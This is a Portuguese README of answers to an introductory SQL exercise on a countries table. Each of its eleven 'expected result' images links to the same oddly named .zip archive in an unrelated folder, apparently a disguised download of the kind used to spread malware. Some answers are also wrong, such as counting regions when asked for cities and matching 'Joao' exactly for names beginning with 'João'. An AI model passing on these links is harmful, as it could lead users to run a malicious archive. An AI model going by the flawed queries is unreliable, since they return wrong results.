# Resolução Atividade III - SQL

<h2>1º Questão</h2>
Selecione todos os dados dos países da tabela_paises.

   ```select * from tabela_paises;```

<h2>Resultado esperado</h2>

![questão 1](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>2º Questão</h2>
Selecione todas as cidades cujo país seja brazil.

```select cidade from tabela_paises where pais ='Brazil';```

<h2>Resultado esperado</h2>

![questão 2](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>3º Questão</h2>
Selecione todas as cidades cuja região(estado) é ceará.

```select cidade from tabela_paises where regiao = 'Ceará';```

<h2>Resultado esperado</h2>

![questão 3](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>4º Questão</h2>
Utilize a função count para saber quantas regiões(estados) existem na China,
utilize também o group by;

```select count(regiao) from tabela_paises where pais = 'China' group by pais;```

<h2>Resultado esperado</h2>

![questão 4](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>5º Questão</h2>
 Quais regiões, diferentes, existem no Canadá?

 ```select distinct regiao from tabela_paises where pais = 'Canada';```

<h2>Resultado esperado</h2>

![questão 5](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>6º Questão</h2>
Quantos países diferentes existem na tabela 'tabela_paises'.

```select count(distinct pais) from tabela_paises;```

<h2>Resultado esperado</h2>

![questão 6](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>7º Questão</h2>
Quantas cidades diferentes existem no brazil.

```select count(distinct regiao) from tabela_paises where pais ='Brazil';```

<h2>Resultado esperado</h2>

![questão 7](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>8º Questão</h2>
 Selecione os países e quantas regiões cada país possui.

 ```select pais, count(distinct regiao) as regioes from tabela_paises group by pais;```
 
<h2>Resultado esperado</h2>

![questão 8](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>9º Questão</h2>
Quantas pessoas com nome começando em 'João' existem no banco?

```select count(*) from tabela_paises where nome ='Joao';```

<h2>Resultado esperado</h2>

![questão 9](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>10º Questão</h2>
Quantas pessoas têm o nome John?

```select count(*) from tabela_paises where nome ='John';```

<h2>Resultado esperado</h2>

![questão 10](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)


<h2>11 Questão</h2>
Ordene os nomes dos países sem repetição em ordem alfabética.

```select distinct pais from tabela_paises order by pais```

<h2>Resultado esperado</h2>

![questão 11](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)

